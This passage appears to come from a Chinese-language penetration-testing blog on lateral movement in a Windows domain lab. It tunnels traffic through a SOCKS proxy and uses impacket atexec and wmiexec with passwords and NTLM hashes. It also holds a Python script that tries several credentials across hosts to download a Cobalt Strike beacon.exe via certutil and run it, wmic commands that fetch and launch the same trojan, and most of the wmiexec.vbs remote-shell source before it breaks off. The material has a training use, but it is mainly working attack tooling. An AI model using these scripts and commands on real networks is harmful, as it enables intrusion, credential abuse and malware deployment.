<p>2.使用python脚本–可能目标没有python环境</p>
<p>解决：</p>
<h3 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h3><p>使用socket节点可实现无文件落地</p>
<p>在webserver与本地上建立socket节点 这样本地就会映射到webserver 那么就意味着我们无需将我们需要的文件放到域内 就可以使用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093368691b1.png" alt="image-20240914012218846"></p>
<p>配置一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093359ce5be.png" alt="image-20240914012253979"></p>
<p>proxifier连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335a6b79d.png" alt="image-20240914013644894"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336399d60.png" alt="image-20240914013556965"></p>
<p>这里的ip是kali的ip</p>
<p>再建立一个CS新规则</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709335d72393.png" alt="image-20240914013722338"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093365423e4.png" alt="image-20240914013746857"></p>
<p>任何只要是192.168.3的都会把流量转发到192.168.10.172代理服务器</p>
<p>这样本地就可以直接访问内网了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933659e423.png" alt="image-20240914013955337"></p>
<p>这样的话我们就可以直接在本地执行套件了</p>
<p>找到刚才那个exe的python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python atexec.py god/administrator:Admin12345@<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">python atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933693ff5a.png" alt="image-20240914014226811"></p>
<p>成功</p>
<p>python脚本批量执行下载木马并执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line"></span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;itadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jack&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vpnadm&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">passs=&#123;</span><br><span class="line">    <span class="string">&#x27;admin!@#45&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Admin12345&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xz</span>():<span class="comment">#下载后门</span></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">                exec1=<span class="string">&#x27;E:\SOFT\Python38\python.exe C:\Users\yh\Desktop\\atexec.py ./administrator:&#x27;</span>+mima+<span class="string">&#x27;@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                exec2=<span class="string">&#x27;E:\SOFT\Python38\python.exe C:\Users\yh\Desktop\\atexec.py god/&#x27;</span>+user+<span class="string">&#x27;:&#x27;</span>+mima+<span class="string">&#x27;@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                <span class="comment">#exec3=&#x27;atexec.exe ./administrator:admin!@#45@192.168.3.32 &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+exec1+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec2 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                os.system(exec1)</span><br><span class="line">                os.system(exec2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():<span class="comment">#执行后门</span></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">                <span class="comment">#exec=&quot;net use \\&quot;+ &quot;\\&quot;+ip+&#x27;\ipc$ &#x27;+mima+&#x27; /user:god\\&#x27;+user</span></span><br><span class="line">                exec1 = <span class="string">&#x27;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py ./administrator:&#x27;</span> + mima + <span class="string">&#x27;@&#x27;</span> + ip + <span class="string">&#x27; &quot;c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                exec2 = <span class="string">&#x27;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py god/&#x27;</span> + user + <span class="string">&#x27;:&#x27;</span> + mima + <span class="string">&#x27;@&#x27;</span> + ip + <span class="string">&#x27; &quot;c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                <span class="comment">#exec3=&#x27;atexec.exe ./administrator:admin!@#45@192.168.3.32 &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec1 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec2 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                os.system(exec1)</span><br><span class="line">                os.system(exec2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    xz()</span><br><span class="line">    <span class="comment"># zx()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>WMI（Windows Management Instrumentation，Windows管理规范）是<strong>一项核心的windows管理技术</strong>。从Windows 98开始，windows操作系统都支持WMI。用户可以通过WMI管理本地和远程计算机。Windows为远程传输WMI数据提供了两个可用的协议，即分布式组件对象模型（Distributed Component Object Model）和windows远程管理（Windows Remote Management，WinRM），使得<strong>WMI对象的查询、事件注册、WMI类方法的执行和类的创建等都可以远程执行</strong>。</p>
<p>利用WMI进行横向移动需要具备以下条件：</p>
<ul>
<li>1、远程主机的WMI服务为开启状态（默认开启）</li>
<li>2、远程主机防火墙放行<strong>135端口</strong>，这是WMI管理的默认端口</li>
</ul>
<p>支持明文以及hash利用</p>
<p>不会再目标的系统日志留下痕迹</p>
<p>WMI命令是没有回显的</p>
<p>环境还是IPC的那个环境</p>
<p>具体渗透就不多说了</p>
<p>总之用CS上线system权限</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336a24485.png" alt="image-20240914123931816"></p>
<p>DC：192.168.3.21</p>
<p>其他3网段都是域内主机</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>因为WMI是windows主机自带的</p>
<p>所以我们不需要向目标上传任何额外文件</p>
<p>可以直接执行命令</p>
<p>查进程</p>
<p><code>wmic /node:192.168.52.138 /user:god\liukaifeng01 /password:hongrisec@2024. process list brief</code></p>
<p>下载木马</p>
<p><code>wmic /node:192.168.3.32 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;</code></p>
<p>执行木马</p>
<p><code>wmic /node:192.168.3.32 /user:administrator /password:Admin12345 process call create &quot;cmd.exe c:/beacon.exe&quot;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933687e835.png" alt="image-20240914125844816"></p>
<p>CS上线</p>
<p>解决WMI无回显：</p>
<p>可以将执行结果写入文件，然后建立IPC连接来远程读取</p>
<p>结果写入文件</p>
<p><code>wmic /node:192.168.52.138 /user:god\liukaifeng01 /password:hongrisec@2024. process call create &quot;cmd.exe /c ipconfig &gt; c:\result.txt&quot;</code> </p>
<p>建立IPC</p>
<p><code>net use \\192.168.52.138\ipc$ hongrisec@2024. /user:god\liukaifeng0</code></p>
<p>读文件</p>
<p><code>type \\192.168.52.138\c$\result.txt</code></p>
<p>或者将木马传输和执行一起执行 看上不上线</p>
<h3 id="套件执行"><a href="#套件执行" class="headerlink" title="套件执行"></a>套件执行</h3><p>我们在IPC用到impacket套件也是支持WMI的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093359cc07b.png" alt="image-20240914130139204"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093359a7094.png" alt="image-20240914130555126"></p>
<p>socks代理会更快点</p>
<p>这也是socks代理的优势</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336870962.png" alt="image-20240914130730853"></p>
<h3 id="插件执行"><a href="#插件执行" class="headerlink" title="插件执行"></a>插件执行</h3><p>cs本身是可以进行横向移动的</p>
<p>目标列表中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933664adc4.png" alt="image-20240914131230726"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933625d939.png" alt="image-20240914131304662"></p>
<p>WMI也是被插件支持的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336ab3224.png" alt="image-20240914131152226"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336a6eb9c.png" alt="image-20240914131643474"></p>
<p>两个都差不多</p>
<h3 id="脚本执行"><a href="#脚本执行" class="headerlink" title="脚本执行"></a>脚本执行</h3><p>脚本如下</p>
<p>命名成wmiexec.vbs</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="comment">&#x27;################################ Temp Result File , Change it to where you like</span></span><br><span class="line"><span class="keyword">Const</span> Path = <span class="string">&quot;C:\&quot;</span></span><br><span class="line"><span class="keyword">Const</span> FileName = <span class="string">&quot;wmi.dll&quot;</span> </span><br><span class="line"><span class="keyword">Const</span> timeOut = <span class="number">1200</span></span><br><span class="line"><span class="comment">&#x27;################################</span></span><br><span class="line">file = Path &amp; <span class="string">&quot;\&quot;</span> &amp; FileName</span><br><span class="line">file = <span class="built_in">Replace</span>(file,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;\&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> fso = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line">FilePath = fso.GetParentFolderName(file) <span class="comment">&#x27;for wmi create share</span></span><br><span class="line"><span class="comment">&#x27;WScript.Echo FilePath</span></span><br><span class="line"></span><br><span class="line">WAITTIME = timeOut              <span class="comment">&#x27;ms  time to execute command ,read result file after 1200ms</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> objArgs = WScript.Arguments</span><br><span class="line">intArgCount = objArgs.Count </span><br><span class="line"><span class="keyword">If</span> intArgCount &lt; <span class="number">2</span> <span class="keyword">Or</span> intArgCount &gt; <span class="number">5</span> <span class="keyword">Then</span></span><br><span class="line">	WScript.Echo </span><br><span class="line">	WScript.Echo <span class="string">&quot;   $$\      $$\ $$\      $$\ $$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\  &quot;</span></span><br><span class="line">	WScript.Echo <span class="string">&quot;   $$ | $\  $$ |$$$\    $$$ |\_$$  _|$$  _____|$$ |  $$ |$$  _____|$$  __$$\ &quot;</span></span><br><span class="line">	WScript.Echo <span class="string">&quot;   $$ |$$$\ $$ |$$$$\  $$$$ |  $$ |  $$ |      \$$\ $$  |$$ |      $$ /  \__|&quot;</span></span><br><span class="line">	WScript.Echo <span class="string">&quot;   $$ $$ $$\$$ |$$\$$\$$ $$ |  $$ |  $$$$$\     \$$$$  / $$$$$\    $$ |      &quot;</span></span><br><span class="line">	WScript.Echo <span class="string">&quot;   $$$$  _$$$$ |$$ \$$$  $$ |  $$ |  $$  __|    $$  $$&lt;  $$  __|   $$ |      &quot;</span></span><br><span class="line">	WScript.Echo <span class="string">&quot;   $$$  / \$$$ |$$ |\$  /$$ |  $$ |  $$ |      $$  /\$$\ $$ |      $$ |  $$\ &quot;</span></span><br><span class="line">	WScript.Echo <span class="string">&quot;   $$  /   \$$ |$$ | \_/ $$ |$$$$$$\ $$$$$$$$\ $$ /  $$ |$$$$$$$$\ \$$$$$$  |&quot;</span></span><br><span class="line">	WScript.Echo <span class="string">&quot;   \__/     \__|\__|     \__|\______|\________|\__|  \__|\________| \______/ &quot;</span></span><br><span class="line">	WScript.Echo <span class="string">&quot;                                               v1.1dev        By. Twi1ight   &quot;</span></span><br><span class="line">	WScript.Echo <span class="string">&quot; Usage:&quot;</span> &amp; _</span><br><span class="line">					vbTab &amp; <span class="string">&quot;wmiexec.vbs  /shell  host&quot;</span> &amp; _</span><br><span class="line">		vbNewLine &amp; vbTab &amp; <span class="string">&quot;wmiexec.vbs  /shell  host  user  pass&quot;</span> &amp; _</span><br><span class="line">		vbNewLine &amp; vbTab &amp; <span class="string">&quot;wmiexec.vbs  /cmd  host  command&quot;</span> &amp; _</span><br><span class="line">		vbNewLine &amp; vbTab &amp; <span class="string">&quot;wmiexec.vbs  /cmd  host  user  pass  command&quot;</span> &amp; vbNewLine &amp; _</span><br><span class="line">		vbNewLine &amp; vbTab &amp; <span class="string">&quot;  /shell&quot;</span>  &amp; vbTab &amp; <span class="string">&quot;half-interactive shell mode&quot;</span> &amp; _</span><br><span class="line">		vbNewLine &amp; vbTab &amp; <span class="string">&quot;  /cmd&quot;</span> &amp; vbTab &amp; vbTab &amp; <span class="string">&quot;single command mode&quot;</span> &amp; _</span><br><span class="line">		vbNewLine &amp; vbTab &amp; <span class="string">&quot;  host&quot;</span> &amp; vbTab &amp; vbTab &amp; <span class="string">&quot;hostname or IP address&quot;</span> &amp; _</span><br><span class="line">		vbNewLine &amp; vbTab &amp; <span class="string">&quot;  command&quot;</span> &amp; vbTab &amp; <span class="string">&quot;the command to execute on remote host&quot;</span> &amp; _</span><br><span class="line">		vbNewLine &amp; vbNewLine &amp; vbTab &amp; <span class="string">&quot;  -waitTIME&quot;</span> &amp; vbTab &amp; _</span><br><span class="line">		 <span class="string">&quot;[both mode] ,delay TIME to read result,&quot;</span>&amp; vbNewLine &amp; vbTab &amp; _</span><br><span class="line">		 vbTab &amp; vbTab &amp;<span class="string">&quot;eg. &#x27;systeminfo -wait5000&#x27; &#x27;ping google.com -wait2000&#x27;&quot;</span> &amp; _</span><br><span class="line">		vbNewLine &amp; vbTab &amp; <span class="string">&quot;  -persist&quot;</span> &amp; vbTab &amp; _</span><br><span class="line">		 <span class="string">&quot;[both mode] ,running command background and persistent&quot;</span> &amp; vbNewLine &amp; vbTab &amp; _</span><br><span class="line">		 vbTab &amp; vbTab &amp;<span class="string">&quot;such as nc.exe or Trojan&quot;</span> </span><br><span class="line">	WScript.Quit()</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(objArgs.Item(<span class="number">0</span>)) &lt;&gt; <span class="string">&quot;/cmd&quot;</span> <span class="keyword">And</span> <span class="built_in">LCase</span>(objArgs.Item(<span class="number">0</span>)) &lt;&gt; <span class="string">&quot;/shell&quot;</span> <span class="keyword">Then</span> </span><br><span class="line">	WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Wrong Mode Specified!&quot;</span></span><br><span class="line">	WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">boolShellMode = <span class="literal">True</span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(objArgs.Item(<span class="number">0</span>)) = <span class="string">&quot;/cmd&quot;</span> <span class="keyword">Then</span> boolShellMode = <span class="literal">False</span></span><br><span class="line"><span class="keyword">If</span> boolShellMode = <span class="literal">False</span> <span class="keyword">Then</span> command = objArgs.Item(intArgCount - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">host = objArgs.Item(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">If</span> intArgCount &gt; <span class="number">3</span> <span class="keyword">Then</span> </span><br><span class="line">	user = objArgs.Item(<span class="number">2</span>)</span><br><span class="line">	pass = objArgs.Item(<span class="number">3</span>)</span><br><span class="line">	<span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">	strNetUse = <span class="string">&quot;cmd.exe /c net use \\&quot;</span> &amp; host &amp; <span class="string">&quot; &quot;&quot;&quot;</span> &amp; pass &amp; <span class="string">&quot;&quot;&quot; &quot;</span> &amp; <span class="string">&quot;/user:&quot;</span> &amp; user</span><br><span class="line">	<span class="comment">&#x27;WScript.Echo strNetUse</span></span><br><span class="line">	objShell.Run strNetUse,<span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="comment">&#x27;Output Status</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Target -&gt; &quot;</span> &amp; host</span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Connecting...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> objLocator = <span class="built_in">CreateObject</span>(<span class="string">&quot;wbemscripting.swbemlocator&quot;</span>)</span><br><span class="line"><span class="keyword">If</span> intArgCount &gt;<span class="number">2</span> <span class="keyword">Then</span></span><br><span class="line">	<span class="keyword">set</span> objWMIService = objLocator.connectserver(host,<span class="string">&quot;root/cimv2&quot;</span>,user,pass)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">	<span class="keyword">Set</span> objWMIService = objLocator.ConnectServer(host,<span class="string">&quot;root/cimv2&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">If</span> Err.Number &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">	WScript.Echo <span class="string">&quot;WMIEXEC ERROR: &quot;</span> &amp; Err.Description </span><br><span class="line">	WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Login -&gt; OK&quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Result File -&gt; &quot;</span> &amp; file</span><br><span class="line"></span><br><span class="line">boolPersist = <span class="literal">False</span></span><br><span class="line"><span class="comment">&#x27;Create Share</span></span><br><span class="line">CreateShare()</span><br><span class="line">CurrentFolder = <span class="literal">Null</span></span><br><span class="line"><span class="comment">&#x27;-----single Command mode------</span></span><br><span class="line"><span class="keyword">If</span> boolShellMode = <span class="literal">False</span> <span class="keyword">Then</span></span><br><span class="line">	WAITTIME = <span class="number">5000</span></span><br><span class="line">	WScript.Echo vbNewLine &amp; vbTab &amp; host &amp; <span class="string">&quot;  &gt;&gt;  &quot;</span> &amp; command</span><br><span class="line">	boolGetFolder = <span class="literal">False</span></span><br><span class="line">	strResult = PhraseCmd( command )</span><br><span class="line">	<span class="comment">&#x27;WScript.Echo strResult</span></span><br><span class="line">	<span class="keyword">If</span> strResult = <span class="string">&quot;persist&quot;</span> <span class="keyword">Then</span></span><br><span class="line">		boolPersist = <span class="literal">True</span></span><br><span class="line">		Exec command,<span class="string">&quot;nul&quot;</span></span><br><span class="line">	<span class="keyword">Else</span></span><br><span class="line">		Exec command, file</span><br><span class="line">		ReadResult()</span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">	<span class="keyword">If</span> intArgCount &gt; <span class="number">3</span> <span class="keyword">Then</span> </span><br><span class="line">		<span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">		strNetUse = <span class="string">&quot;cmd.exe /c net use \\&quot;</span> &amp; host &amp; <span class="string">&quot; /del&quot;</span></span><br><span class="line">		objShell.Run strNetUse,<span class="number">0</span></span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">	DeleteShare()</span><br><span class="line">	WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="comment">&#x27;------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;++++++++shell mode++++++++++++</span></span><br><span class="line"><span class="comment">&#x27;get current working directory</span></span><br><span class="line">boolGetFolder = <span class="literal">True</span></span><br><span class="line">CurrentFolder = Exec(<span class="string">&quot;cd&quot;</span>, file)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;WScript.Echo CurrentFolder</span></span><br><span class="line"><span class="keyword">Do</span> <span class="keyword">While</span> <span class="literal">True</span></span><br><span class="line">	boolPersist = <span class="literal">False</span></span><br><span class="line">	WAITTIME = timeOut</span><br><span class="line">	wscript.stdout.write(CurrentFolder &amp; <span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">	command = wscript.stdin.ReadLine</span><br><span class="line">	<span class="comment">&#x27;press &#x27;Enter&#x27; directorly</span></span><br><span class="line">	<span class="keyword">Do</span> <span class="keyword">While</span> command = <span class="string">&quot;&quot;</span></span><br><span class="line">		wscript.stdout.write(CurrentFolder &amp; <span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">		command = wscript.stdin.ReadLine</span><br><span class="line">	<span class="keyword">Loop</span></span><br><span class="line">	<span class="keyword">If</span> <span class="built_in">LCase</span>(<span class="built_in">Trim</span>(command)) = <span class="string">&quot;exit&quot;</span> <span class="keyword">Then</span> <span class="keyword">Exit</span> <span class="keyword">Do</span></span><br><span class="line">	<span class="comment">&#x27;If Not IsEmpty(command) Then </span></span><br><span class="line">	<span class="comment">&#x27;process &#x27;cd&#x27; command--------&gt;&gt;&gt;&gt;</span></span><br><span class="line">	strResult = PhraseCmd( command )</span><br><span class="line">	<span class="keyword">If</span> strResult = <span class="string">&quot;cd&quot;</span> <span class="keyword">Then</span> </span><br><span class="line">		command = command &amp; <span class="string">&quot; &amp; cd &quot;</span></span><br><span class="line">		boolGetFolder = <span class="literal">True</span></span><br><span class="line">		DestFolder = Exec(command, file)</span><br><span class="line">		<span class="keyword">If</span> CurrentFolder = DestFolder <span class="keyword">Then</span> </span><br><span class="line">			WScript.Echo <span class="string">&quot;The system cannot find the path specified.&quot;</span></span><br><span class="line">		<span class="keyword">Else</span></span><br><span class="line">			CurrentFolder = DestFolder</span><br><span class="line">		<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">	<span class="keyword">ElseIf</span> strResult = <span class="string">&quot;persist&quot;</span> <span class="keyword">Then</span></span><br><span class="line">		boolPersist = <span class="literal">True</span></span><br><span class="line">		<span class="comment">&#x27;WScript.Echo &quot;persist&quot;</span></span><br><span class="line">		Exec command,<span class="string">&quot;nul&quot;</span></span><br><span class="line">		<span class="comment">&#x27;##########################################toDo</span></span><br><span class="line">	<span class="comment">&#x27;-----------&lt;&lt;&lt;&lt;</span></span><br><span class="line">	<span class="keyword">Else</span></span><br><span class="line">		<span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">		err.clear</span><br><span class="line">		Exec command, file</span><br><span class="line">		ReadResult()</span><br><span class="line">	    <span class="keyword">If</span> err.number &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> wscript.echo( <span class="string">&quot;WMIEXEC ERROR: &quot;</span> &amp; Err.Number &amp; <span class="string">&quot; &quot;</span> &amp; err.description)</span><br><span class="line">		Err.Clear</span><br><span class="line">	    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Goto</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">loop</span></span><br><span class="line"></span><br><span class="line">strDelFile = <span class="string">&quot;del &quot;</span> &amp; file &amp; <span class="string">&quot; /F&quot;</span></span><br><span class="line">Exec strDelFile,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="keyword">If</span> intArgCount &gt; <span class="number">3</span> <span class="keyword">Then</span> </span><br><span class="line">	<span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">	strNetUse = <span class="string">&quot;cmd.exe /c net use \\&quot;</span> &amp; host &amp; <span class="string">&quot; /del&quot;</span></span><br><span class="line">	objShell.Run strNetUse,<span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">DeleteShare()</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;#####################################</span></span><br><span class="line"><span class="keyword">Function</span> 